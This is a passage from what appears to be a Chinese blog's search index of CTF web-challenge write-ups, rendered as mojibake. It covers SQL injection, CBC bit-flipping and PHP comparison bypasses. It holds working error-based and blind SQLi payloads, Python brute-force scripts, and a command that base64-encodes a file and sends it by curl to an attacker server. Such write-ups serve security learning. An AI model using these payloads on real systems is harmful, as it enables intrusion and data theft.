å¤´ï¼Œä½†æ˜¯æ— æ•ˆã€‚å› æ­¤æˆ‘ä»¬æ¢è€Œä¿®æ”¹ client-ip å¤´ä¸º 127.0.0.1 å¾—åˆ° flagã€‚ ","date":"2019-08-24","objectID":"/icq-web/:16:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Vld F12 å¾—åˆ°æç¤º index.php.txtï¼Œè®¿é—®å¾—åˆ°äº†ä¸€ä¸ªçœ‹ä¸å¤ªæ‡‚çš„æ–‡ä»¶ï¼Œä¼¼ä¹æ˜¯ php çš„ opcodeã€‚è€å¿ƒåˆ†æè¿˜æ˜¯ä¸éš¾ç†è§£çš„ï¼Œéœ€è¦ä¸‰ä¸ª GET å‚æ•° flag1, flag2, flag3ï¼Œåˆ†åˆ«ç­‰äº fvhjjihfcv, gfuyiyhioyf, yugoiiyhiã€‚è®¿é—®æ–° url å¯ä»¥ä¸‹è½½åˆ°æºç ã€‚ è§‚å¯Ÿæºç å‘ç°å…³é”®çš„åœ°æ–¹åœ¨äºï¼š /* dbmysql.class.php */ public function my_md5($string){ return md5(substr(md5($string),5,24)); } public function safe_data($value){ if(MAGIC_QUOTES_GPC){ stripcslashes($value); } return addslashes($value); } /* login.php */ $username = $db-\u003esafe_data($_POST['username']); $password = $db-\u003emy_md5($_POST['password']); $number = is_numeric($_POST['number']) ? $_POST['number'] : 1; $username = trim(str_replace($number,'', $username)); $sql = \"select * from\".\"`\".table_name.\"`\".\"where username=\".\"'\".\"$username\".\"'\"; è¿™é‡Œå¯ä»¥çœ‹åˆ° username ä¼šå…ˆè¢« addslashesï¼Œç„¶åå…¶ä¸­å’Œ number ç›¸åŒçš„éƒ¨åˆ†ä¼šè¢«å»æ‰ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½è®© ' é€ƒè¿‡è½¬ä¹‰ï¼Œå½“æˆ‘ä»¬æäº¤ username=%00' æ—¶ï¼Œä¼šè¢« addslashes è½¬ä¹‰ä¸º \\0\\'ï¼Œå¦‚æœ number=0ï¼Œåˆ™å…¶ä¸­çš„ 0 ä¼šè¢«æ›¿æ¢æ‰å˜æˆ \\\\'ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ª \\ è¢«è½¬ä¹‰ï¼ŒåŸ SQL è¯­å¥å˜ä¸º where username='\\\\'ï¼ŒæˆåŠŸé—­åˆã€‚ ç„¶åå°±æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œæ³¨æ„è¯­å¥ä¸­ä¸èƒ½å†å‡ºç° 0 äº†ï¼š number=0\u0026username=%00'or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema=database()),hex(126)),1)#\u0026password=ccc\u0026submit= number=0\u0026username=%00'or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#\u0026password=ccc\u0026submit= number=0\u0026username=%00'or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#\u0026password=ccc\u0026submit= ","date":"2019-08-24","objectID":"/icq-web/:17:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"EXEC F12 åœ¨ html çš„ head æ ‡ç­¾ä¸­å‘ç° editor=\"vim\"ï¼Œæ˜¾ç„¶èƒ½ä¸‹è½½ .index.php.swpï¼š \u003c?php /* flag in flag233.php */ function check($number) { $one = ord('1'); $nine = ord('9'); for ($i = 0; $i \u003c strlen($number); $i++) { $digit = ord($number{$i}); if (($digit\u003e= $one) \u0026\u0026 ($digit \u003c= $nine) ) { return false; } } return $number == '11259375'; } if(isset($_GET[sign])\u0026\u0026 check($_GET[sign])){ setcookie('auth','tcp tunnel is forbidden!'); if(isset($_POST['cmd'])){ $command=$_POST[cmd]; $result=exec($command); //echo $result; } }else{ die('no sign'); } ?\u003e é¦–å…ˆéœ€è¦ä¸€ä¸ª GET å‚æ•°ï¼Œå…¶å€¼ä¸º 11259375 ä½†ä¸èƒ½åŒ…å« 1-9 ä¸­çš„æ•°å­—ã€‚æ³¨æ„åˆ°è¿™é‡Œçš„å¼±æ¯”è¾ƒï¼Œå¯ä»¥å°†è¯¥æ•°å­—è½¬ä¸ºåå…­è¿›åˆ¶ï¼Œæ°å¥½ä¸º 0xabcdefï¼Œä¸åŒ…å« 1-9ï¼Œå› æ­¤æäº¤ ?sign=0xabcdef å¯ä»¥å‘ç° no sign çš„æç¤ºæ²¡æœ‰äº†ã€‚ æ¥ä¸‹æ¥åœ¨ä¿ç•™åˆšæ‰çš„å‚æ•°çš„åŒæ—¶ POST å‘½ä»¤å°±å¯ä»¥æ‰§è¡Œäº†ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼ŒçŒœæƒ³æ˜¯é€šè¿‡ nc æŠŠ flag233.php åå¼¹åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”éœ€è¦èµ° UDPï¼Œä½†æ˜¯æœ€ç»ˆæ²¡æœ‰æˆåŠŸã€‚æœ€ç»ˆé‡‡ç”¨äº† curl çš„æ–¹æ³•ï¼ŒæŠŠæ–‡ä»¶å†…å®¹ base64 ç¼–ç åæ”¾åœ¨ url é‡Œå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­æŸ¥çœ‹ flagã€‚payloadï¼š cmd=data=$(cat flag233.php | base64);curl http://xx.xx.xx.xx?data=$data; åœ¨ access.log ä¸­å³å¯å¾—åˆ°ç¼–ç åçš„ flag233.phpã€‚ ","date":"2019-08-24","objectID":"/icq-web/:18:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"å®éªŒå§çš„ Web é¢˜æ€»ä½“æ¯” Bugku éš¾ä¸€äº›ï¼Œä¸»è¦éš¾åº¦åœ¨äºå‡ é“æ³¨å…¥é¢˜ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:0:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"ç®€å•çš„ç™»å½•é¢˜ éå¸¸ä¸å‹å¥½çš„ç¬¬ä¸€é¢˜ã€‚ã€‚ éšä¾¿è¾“å…¥ id å‘é€å¹¶æŠ“åŒ…ï¼Œåœ¨è¯·æ±‚åŒ…ä¸­çš„ cookie ä¸­å‘ç° iv å’Œ cipherï¼Œå¯ä»¥ç¡®å®šæ˜¯å¯¹ç§°å¯†ç é¢˜ã€‚ã€‚å“åº”å¤´ä¸­æœ‰ä¸ªæç¤º test.phpï¼Œè®¿é—®å¾—åˆ°ä¸€å¤§æ®µä»£ç ï¼š define(\"SECRET_KEY\", '***********'); define(\"METHOD\", \"aes-128-cbc\"); error_reporting(0); include('conn.php'); function sqliCheck($str){ if(preg_match(\"/\\\\\\|,|-|#|=|~|union|like|procedure/i\",$str)){ return 1; } return 0; } function get_random_iv(){ $random_iv=''; for($i=0;$i\u003c16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(\"iv\", base64_encode($iv)); setcookie(\"cipher\", base64_encode($cipher)); } function show_homepage(){ global $link; if(isset($_COOKIE['cipher']) \u0026\u0026 isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[\"iv\"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(\"\u003cp\u003ebase64_decode('\".base64_encode($plain).\"') can't unserialize\u003c/p\u003e\"); $sql=\"select * from users limit\".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)\u003e0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo '\u003ch1\u003e\u003ccenter\u003eHello!'.$rows['username'].'\u003c/center\u003e\u003c/h1\u003e'; } else{ echo '\u003ch1\u003e\u003ccenter\u003eHello!\u003c/center\u003e\u003c/h1\u003e'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"\u003ch1 style='color:red'\u003e\u003ccenter\u003esql inject detected!\u003c/center\u003e\u003c/h1\u003e\"); $info = array('id'=\u003e$id); login($info); echo '\u003ch1\u003e\u003ccenter\u003eHello!\u003c/center\u003e\u003c/h1\u003e'; }else{ if(isset($_COOKIE[\"iv\"])\u0026\u0026isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo '\u003cbody class=\"login-body\"style=\"margin:0 auto\"\u003e \u003cdiv id=\"wrapper\"style=\"margin:0 auto;width:800px;\"\u003e \u003cform name=\"login-form\"class=\"login-form\"action=\"\"method=\"post\"\u003e \u003cdiv class=\"header\"\u003e \u003ch1\u003eLogin Form\u003c/h1\u003e \u003cspan\u003einput id to login\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"content\"\u003e \u003cinput name=\"id\"type=\"text\"class=\"input id\"value=\"id\"onfocus=\"this.value=\\'\\'\"/\u003e \u003c/div\u003e \u003cdiv class=\"footer\"\u003e \u003cp\u003e\u003cinput type=\"submit\"name=\"submit\"value=\"Login\"class=\"button\"/\u003e\u003c/p\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e'; } } é¦–å…ˆä¼šå¯¹æäº¤çš„å‚æ•° id è¿›è¡Œè¿‡æ»¤é˜²æ­¢ SQL æ³¨å…¥ï¼Œéšåä¼šéšæœºç”Ÿæˆä¸€ä¸ª ivï¼Œå¹¶æ ¹æ®åºåˆ—åŒ–åçš„ id ç”Ÿæˆæ˜æ–‡å¹¶åŠ å¯†ï¼ŒåŠ å¯†æ–¹å¼ä¸º aes-128-cbcã€‚å®¹æ˜“æƒ³åˆ° CBC å­—èŠ‚ç¿»è½¬æ”»å‡»ã€‚iv å’Œ cipher è¿™é‡Œéƒ½ç»è¿‡äº† base64 ç¼–ç ã€‚ å¦‚æœæ²¡æœ‰æäº¤å‚æ•° idï¼Œåˆ™æ‰§è¡Œä¸ä¸Šè¿°è¿‡ç¨‹ç›¸åçš„è§£å¯†è¿‡ç¨‹å¾—åˆ°æ˜æ–‡ã€‚å¦‚æœå¾—åˆ°çš„æ˜æ–‡æ— æ³•ååºåˆ—åŒ–ï¼Œå°†ç›´æ¥è¿”å›å…¶ base64ï¼›å¦åˆ™è¿›è¡Œ sql æŸ¥è¯¢ï¼š select*fromuserslimit?,0 è¿™é‡Œçš„é—®å·æ˜¾ç„¶å°±æ˜¯æ³¨å…¥ç‚¹äº†ã€‚å°è¯•æ„é€ ï¼š select*fromuserslimit1#,0 ä½†æ˜¯ # å’Œ -- ä¸¤ç§æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†ï¼Œè€ƒè™‘ä½¿ç”¨ %00ã€‚å…ˆæäº¤ï¼š id=1;%00 å¾—åˆ° iv å’Œ cipherï¼Œç„¶åè®¾ç½®åˆ° cookie é‡Œå¹¶å»æ‰å‚æ•° id å†æ¬¡æäº¤ï¼Œæ˜¾ç¤º Hello!rootzzï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸã€‚ è¿™åŒæ—¶ä¹Ÿè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ iv å’Œ cipher æ§åˆ¶ idï¼Œè€Œ iv å’Œ cipher æ˜¯æ²¡æœ‰è¿‡æ»¤çš„ï¼Œæ‰€ä»¥å¯ä»¥æˆåŠŸç»•è¿‡ id çš„è¿‡æ»¤æœºåˆ¶ã€‚å…·ä½“å¦‚ä½•ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯ CBC å­—èŠ‚ç¿»è½¬æ”»å‡»çš„å…·ä½“è¿‡ç¨‹å¯ä»¥å‚è€ƒ æˆ‘çš„è¿™ç¯‡åšå®¢ ä¸­çš„æœ€åä¸€é¢˜ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬æäº¤ id=12ï¼Œåºåˆ—åŒ–ååˆ†ç»„å¦‚ä¸‹ï¼š Block 0: a:1:{s:2:\"id\";s: Block 1: 2:\"12\";} å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç¿»è½¬ç¬¬ 0 ç»„çš„ç¬¬ 4 å­—èŠ‚ï¼ˆä» 0 å¼€å§‹è®¡æ•°ï¼‰ï¼Œå³å¯æ§åˆ¶ id=12 ä¸­çš„ 2 äº†ã€‚å†æ¯”å¦‚ï¼Œæˆ‘ä»¬æäº¤ id=0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);ï¼ˆæ˜¾ç„¶è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ join æ›¿æ¢é€—å·ï¼Œå¹¶ä¸”æƒ³æŠŠ 2 æ¢æˆ u æ¥ç»•è¿‡æ£€æµ‹ï¼‰ï¼Œåºåˆ—åŒ–ååˆ†ç»„å¦‚ä¸‹ï¼š Block 0: a:1:{s:2:\"id\";s: Block 1: 70:\"0 2nion sele Block 2: ct * from ((sele Block 3: ct 1)a join (sel Block 4: ect 2)b join (se Block 5: lect 3)c); è¿™é‡Œè¦ç¿»è½¬çš„å˜æˆäº†ç¬¬ 6 å­—èŠ‚ï¼Œè€Œå¦‚æœ payload é•¿åº¦å¤§äºç­‰äº 100ï¼Œåˆ™éœ€è¦ç¿»è½¬ç¬¬ 7 å­—èŠ‚äº†ã€‚ æ­¤å¤–ï¼Œéœ€è¦æ³¨æ„åœ¨ payload æœ«å°¾æ·»åŠ  %00ã€‚å¦‚æœç›´æ¥æ·»åŠ å¯èƒ½ä¼šè¢«äºŒæ¬¡ URL ç¼–ç ï¼Œå› æ­¤å¯ä»¥ç”¨ chr(0) æ¥æ·»åŠ ã€‚å®Œæ•´è„šæœ¬ï¼š import base64 import urllib import requests import re def login(payload, i, old, new): url = r'http://ctf5.shiyanbar.com/web/jiandan/index.php' data = {'id': payload} r = requests.post(url=url, data=data) sc = r.headers['Set-Cookie'] cipher = re.findall(r'cipher=(.*)', sc)[0] iv = re.findall(r'iv=(.*),', sc)[0] # print(cipher) # print(iv) cd = base64.b64decode(urllib.parse.unquote(cipher)) ivd = base64.b64decode(urllib.parse.unquote(iv)) ch = bytes([cd[i] ^ ord(new) ^ ord(old)]) cd = cd[:i] + ch + cd[i+1:] cnew = urllib.parse.quote(base64.b64encode(cd)) # print(cnew) cookie0 = {'iv': iv, 'cipher': cnew} r = requests.post(url=url, cookies=cookie0) plain = re.findall(r\"base64_decode\\('(.*)'\\)\", r.text)[0] pd = base64.b64decode(plain) block0 = 'a:1:{s:2:\"id\";s:' for i in range(16): ch = bytes([ivd[i] ^ pd[i] ","date":"2019-07-26","objectID":"/shiyanba-web/:1:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"åå°ç™»å½• F12 æ‰¾åˆ°ï¼š $password=$_POST['password']; $sql = \"SELECT * FROM admin WHERE username ='admin'and password ='\".md5($password,true).\"'\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)\u003e0){ echo 'flag is :'.$flag; } else{ echo 'å¯†ç é”™è¯¯!'; } è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯åœ¨ SQL æ³¨å…¥ä¸­å¼•å…¥äº†å“ˆå¸Œå‡½æ•°ã€‚å…¶ä¸­ md5($password, true) è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ å› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿å¾—å…¶ md5 å€¼ç”± 16 è¿›åˆ¶è½¬ä¸ºå­—ç¬¦ä¸²åï¼ŒåŒ…å« 'or'numï¼ˆnum ä¸ºä»»æ„æ•°å­—ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥ç»„æˆ SQL è¯­å¥ï¼š andpassword=''or'num' ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸² ffifdyopï¼Œå…¶ md5 å€¼ä¸º 276f722736c95d99e921722cf9ed621cï¼Œå¯¹åº”å­—ç¬¦ä¸²å¼€å¤´ä¸º 'or'6ï¼Œå› æ­¤ SQL è¯­å¥æ‰§è¡Œç»“æœä¸º trueï¼ŒæˆåŠŸç™»å½•ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:2:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"åŠ äº†æ–™çš„æŠ¥é”™æ³¨å…¥ è¿™é¢˜æ¯”è¾ƒæœ‰è¶£çš„æ˜¯ï¼Œusername ä¸­è¿‡æ»¤äº† ()ï¼Œè€Œ password ä¸­è¿‡æ»¤äº†å¾ˆå¤šæŠ¥é”™æ³¨å…¥ç”¨çš„å‡½æ•°åã€‚å› æ­¤å¯ä»¥è€ƒè™‘å°†ä¸¤è€…æ‹¼æ¥ï¼Œåœ¨ username ä¸­ä½¿ç”¨å‡½æ•°ä½†æŠŠ () ç§»åŠ¨åˆ° password é‡Œï¼Œæœ€åæ³¨é‡Šæ‰ä¸­é—´çš„ SQL è¯­å¥ã€‚æ­¤å¤–ï¼Œpassword è¿˜è¿‡æ»¤äº† =ï¼Œç”¨åŒé‡å¦å®šç»•è¿‡å³å¯ã€‚ username='and updatexml/*\u0026password=*/(1,concat(0x7e,(select database()),0x7e),1) or '1 # XPATH syntax error: '~error_based_hpf~' username='and updatexml/*\u0026password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema\u003c\u003e'error_based_hpf')),0x7e),1) or '1 # XPATH syntax error: '~ffll44jj,users~' username='and updatexml/*\u0026password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where !(table_name\u003c\u003e'ffll44jj')),0x7e),1) or '1 # XPATH syntax error: '~value~' username='and updatexml/*\u0026password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or '1 # XPATH syntax error: '~flag{err0r_b4sed_sqli_+_hpf}~' å¦å¤–ï¼Œæœ¬é¢˜ä¹Ÿå¯ä»¥ç”¨ exp å’Œ extractvalue å‡½æ•°ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:3:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"è®¤çœŸä¸€ç‚¹ï¼ è¿‡æ»¤äº† andï¼Œunionï¼Œç©ºæ ¼ï¼Œé€—å·ç­‰ç­‰ï¼Œor éœ€è¦åŒå†™ç»•è¿‡ã€‚ä¹‹åè¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚ çˆ†æ•°æ®åº“åé•¿åº¦ï¼š import requests success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' for i in range(1, 30): data = {'id':\"0'oorr(length(database())=%s)oorr'0\" % i} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break å¾—åˆ°æ•°æ®åº“åé•¿åº¦ä¸º 18ã€‚çˆ†æ•°æ®åº“åï¼š import requests import string success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' chrset = string.digits + string.ascii_lowercase + '_!~' db = '' for i in range(1, 19): for j in chrset: data = {'id':\"0'oorr(mid(database()from(%s)foorr(1))='%s')oorr'0\" % (i,j)} print(data) r = requests.post(url, data=data) if success in r.text: db += j print(db) break å¾—åˆ°æ•°æ®åº“å ctf_sql_bool_blindã€‚çˆ†è¡¨åé•¿åº¦ï¼š import requests import string success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' chrset = string.digits + string.ascii_lowercase + '_!~' i = 1 while True: val = \"0'oorr((select(mid(group_concat(table_name separatoorr'@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0\" % i data = {'id': val.replace('', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break i += 1 å¾—åˆ°æ‰€æœ‰è¡¨åè¿æ¥èµ·æ¥åï¼ŒåŒ…å«åˆ†éš”ç¬¦ @ çš„æ€»é•¿ä¸º 10ã€‚çˆ†è¡¨åï¼š import requests import string success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' chrset = string.digits + string.ascii_lowercase + '_!~@' table = '' for i in range(1, 12): for j in chrset: val = \"0'oorr((select(mid(group_concat(table_name separatoorr'@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%s')oorr'0\" % (i, j) data = {'id': val.replace('', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: table += j print(table) break å¾—åˆ°è¡¨å fiag å’Œ usersï¼Œæ˜¾ç„¶å‰è€…æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚ç”¨åŒæ ·çš„æ–¹æ³•çˆ†åˆ—åé•¿åº¦å’Œåˆ—å fl$4gã€‚æœ€åçˆ† flag å†…å®¹çš„é•¿åº¦ï¼š import requests import string success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\\}?!:@#$%\u0026()[],.' i = 1 while True: val = \"0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='')oorr'0\" % i data = {'id': val.replace('', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print('Finished, len = %s' % i) break i += 1 å¾—é•¿åº¦ä¸º 13ï¼Œçˆ† flag å†…å®¹ï¼š import requests import string success = 'You are in' url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\\}?!:@#$%\u0026()[],.' flag = '' for i in range(1, 14): for j in chrset: val = \"0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0\" % (i, j) data = {'id': val.replace('', chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: flag += j print(flag) break å¾—åˆ° flag{haha~youï¼Œå¾ˆæ˜æ˜¾å¹¶ä¸å®Œæ•´ã€‚å°†æ•°å­—æ”¹å¤§åå†è·‘ä¸€æ¬¡ï¼Œå¾—åˆ° flag{haha~you-win}----ï¼Œæ³¨æ„åˆ°å³èŠ±æ‹¬å·åé¢æ˜¯è‹¥å¹²ä¸ª -ï¼Œåº”è¯¥å¿½ç•¥ã€‚æäº¤åå‘ç°ç­”æ¡ˆé”™è¯¯ã€‚ è¿™æ—¶å€™å°±éœ€è¦è€ƒè™‘å³èŠ±æ‹¬å·åé¢å…¨éƒ½æ˜¯ - çš„åŸå› äº†ã€‚æˆ‘ä»¬æ„é€ çš„ payloadï¼Œç®€åŒ–åå†™å‡ºæ¥å°±æ˜¯ï¼š \"0' or (select mid(fl$4g from(i) for(1)) from fiag) = '-' or '0 å…¶ä¸­ i æ˜¯æ•°å­—ï¼Œè¡¨ç¤º fl$4g çš„ç¬¬ i ä¸ªå­—ç¬¦ã€‚å½“æ˜¾ç¤º You are in æ—¶åœæ­¢ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ï¼Œä¸‹é¢è¿™ä¸ªå€¼ä¸º Trueï¼š (selectmid(fl$4gfrom(i)for(1))fromfiag)='-' å½“ i å¤§äºç­‰äº 20 æ—¶ï¼Œæ˜¾ç„¶æ­¤æ—¶ fl$4g è¿™ä¸€åˆ—çš„å¯¹åº”å†…å®¹å·²ç»ä¸ºç©ºäº†ï¼Œä½†æ˜¯å´ä¾ç„¶èƒ½ç­‰äº -ã€‚è¿™è¯´æ˜æœåŠ¡ç«¯é€šè¿‡æŸç§æ–¹å¼å°†ç©ºæ ¼è½¬ä¹‰æˆäº† -ã€‚å› æ­¤çœŸæ­£çš„ flag åº”è¯¥è¿›è¡Œåè½¬ä¹‰ï¼Œå¾—åˆ° flag{haha~you win!}ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:4:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"ä½ çœŸçš„ä¼š PHP å—ï¼Ÿ å“åº”å¤´ä¸­æœ‰æç¤º 6c525af4059b4fe7d8c33a.txtï¼Œå¾—åˆ°ä»£ç ï¼š \u003c?php $info = \"\"; $req = []; $flag=\"xxxxxxxxxx\"; ini_set(\"display_error\", false); error_reporting(0); if(!isset($_POST['number'])){ header(\"hint:6c525af4059b4fe7d8c33a.txt\"); die(\"have a fun!!\"); } foreach([$_POST] as $global_var) { foreach($global_var as $key =\u003e $value) { $value = trim($value); is_string($value) \u0026\u0026 $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u003c $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])){ $info=\"sorry, you cann't input a number!\"; }elseif($req['number']!=strval(intval($req['number']))){ $info = \"number must be equal to it's integer!! \"; }else{ $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1!=$value2){ $info=\"no, this is not a palindrome number!\"; }else{ if(is_palindrome_number($req[\"number\"])){ $info = \"nice! {$value1}is a palindrome number!\"; }else{ $info=$flag; } } } echo $info; éšåå°±æ˜¯æºç å®¡è®¡äº†ï¼Œnumber ä¸èƒ½ä¸ºç©ºä¸”éœ€è¦ç»•è¿‡ is_numericï¼ŒåŒæ—¶è¿˜ä¸èƒ½æ˜¯å›æ–‡æ•°ï¼Œä½†æ˜¯å°†è¿™ä¸ªæ•°å‰åé¢ å€’å¾—åˆ°çš„æ•°å€¼åº”ç­‰äºå®ƒæœ¬èº«ã€‚ åœ¨ 32 ä½ç³»ç»Ÿä¸Šè¿è¡Œçš„ PHP ä¼šæŠŠå¤§äº 2147483647 çš„æ•°å€¼è®¤ä¸ºæ˜¯ç­‰äº 2147483647 çš„ï¼Œå› æ­¤ 2147483647 å‰åé¢ å€’ï¼Œå¯¹ PHP æ¥è¯´å…¶æ•°å€¼ç­‰äºå®ƒæœ¬èº«ã€‚æœ€åç”¨ %00 ç»•è¿‡ is_numeric å³å¯ï¼Œpayloadï¼š2147483647%00ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:5:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"ç™»é™†ä¸€ä¸‹å¥½å—ï¼Ÿï¼Ÿ èƒ½è¿‡æ»¤çš„éƒ½è¿‡æ»¤äº†ï¼Œåˆ©ç”¨ä¸‡èƒ½å¯†ç  '='ã€‚åŸç†ï¼š whereusername=''=''andpassword=''='' å…¶ä¸­ username='' ç»“æœä¸º falseï¼Œè¿™å’Œç©ºå­—ç¬¦ä¸²è¢«è®¤ä¸ºæ˜¯ç›¸ç­‰çš„ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:6:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"å› ç¼ºæ–¯æ±€çš„ç»•è¿‡ å‚è€ƒåšå®¢ï¼ŒåŒ…å«å…³äº rollup çš„ç”ŸåŠ¨é˜é‡Š F12 å‘ç° source.txtï¼š \u003c?php error_reporting(0); if (!isset($_POST['uname']) || !isset($_POST['pwd'])) { echo '\u003cform action=\"\"method=\"post\"\u003e'.\"\u003cbr/\u003e\"; echo '\u003cinput name=\"uname\"type=\"text\"/\u003e'.\"\u003cbr/\u003e\"; echo '\u003cinput name=\"pwd\"type=\"text\"/\u003e'.\"\u003cbr/\u003e\"; echo '\u003cinput type=\"submit\"/\u003e'.\"\u003cbr/\u003e\"; echo '\u003c/form\u003e'.\"\u003cbr/\u003e\"; echo '\u003c!--source: source.txt--\u003e'.\"\u003cbr/\u003e\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print 